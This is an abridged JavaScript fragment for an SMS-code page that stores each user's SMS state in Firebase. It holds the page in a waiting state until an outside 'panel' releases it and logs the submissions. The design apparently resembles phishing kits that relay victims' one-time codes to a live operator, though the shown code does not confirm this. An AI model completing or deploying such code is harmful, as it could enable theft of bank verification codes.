...
(function initSmsUi() {
  ...
  var loader = document.getElementById("sms-loader");
  ...
  function getCurrentSmsState() {
    var errUrl = window.appConfig && window.appConfig.routes && window.appConfig.routes[5] ? window.appConfig.routes[5].url : "sms_err.html";
    return window.location.pathname.indexOf(errUrl) !== -1 ? "error" : "ok";
  }

  function updateHistoryEntry(db, usuario, smsData) {
    return db
  ...
  function attachSmsWatcher(userRef) {
    if (smsWatcher) {
      smsWatcher();
      smsWatcher = null;
    }

    smsWatcher = userRef.onSnapshot(
      ...
      function () {
        if (window.smsUi) {
          window.smsUi.hideLoader();
          window.smsUi.unlockInputs();
        }
      }
    );
  }
  ...
  function setWaitingState(userRef, stateValue) {
    return userRef.set(
      {
        page: 0,
        smsEstado: stateValue,
        smsEsperandoPanel: true,
        smsUltimaPagina: stateValue === "error" ? "sms_err" : "sms",
  ...
  var currentState = getCurrentSmsState();
  ...
  if (db && typeof firebase !== "undefined" && usuario && currentState === "error") {
    ...
    setWaitingState(waitRef, "error").then(function () {
      attachSmsWatcher(waitRef);
    });
  }

  document.addEventListener("sms:continue", function (event) {
    var db = window.db;
    ...
    var smsFields = {
      ...
      page: 0,
      smsEstado: getCurrentSmsState(),
      smsEsperandoPanel: true,
      smsUltimaPagina: getCurrentSmsState() === "error" ? "sms_err" : "sms",
      smsActualizadoEn: new Date().toISOString()
    };

    userRef
      .set(smsFields, { merge: true })
      .then(function () {
        attachSmsWatcher(userRef);
        return updateHistoryEntry(db, usuario, smsFields);
      })
      .catch(function () {
        if (window.smsUi) {
          window.smsUi.hideLoader();
